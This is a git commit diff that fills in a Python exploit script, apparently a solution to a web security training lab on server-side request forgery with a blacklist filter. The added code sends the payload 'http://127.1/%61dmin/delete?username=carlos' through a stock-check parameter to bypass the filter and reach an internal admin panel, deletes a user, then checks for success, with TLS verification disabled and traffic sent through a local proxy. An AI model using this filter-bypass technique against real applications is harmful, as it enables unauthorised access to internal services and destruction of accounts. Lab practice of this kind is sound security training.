949a9743d29d6e40efa74cdf5d15e5914a73a5ff
Kryvchenko <amzkryvchenko@gmail.com>
2024-08-16 12:51:44 -0400

    fix: add blacklist input test

--- blacklist-based-input/blacklist-input.py
+++ blacklist-based-input/blacklist-input.py
@@ -1,19 +1,27 @@
 import requests
 import sys
 import urllib3
-from urllib.parse import urljoin
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
 
-def decode_admin_hostname(url):
-    return
+def delete_user(url):
+    delete_user_url_ssrf_payload = 'http://127.1/%61dmin/delete?username=carlos'
+    check_stock_path = '/product/stock'
+    params = {'stockApi': delete_user_url_ssrf_payload}
+    r = requests.post(url + check_stock_path,
+                      data=params, verify=False,  proxies=proxies)
 
-
-def delete_user():
-    return
+    # Check if user was deleted
+    params2 = {'stockApi': 'http://127.1/%61dmin/'}
+    r = requests.post(url + check_stock_path, data=params2,
+                      verify=False, proxies=proxies)
+    if 'User deleted successfully' in r.text:
+        print("(+) Successfully deleted Carlos user!")
+    else:
+        print("(-) Exploit was not successful.")
 
 
 def main():
@@ -24,14 +32,7 @@ def main():
 
     url = sys.argv[1]
     print("(+) Finding admin hostname...")
-    admin_ip_address = check_admin_hostname(url)
-
-    if admin_ip_address:
-        print(f"(+) Found the admin IP address: {admin_ip_address}")
-        print("(+) Deleting Carlos user...")
-        delete_user(url, admin_ip_address)
-    else:
-        print("(-) Admin IP address not found, aborting.")
+    delete_user(url)
 
 
 if __name__ == "__main__":
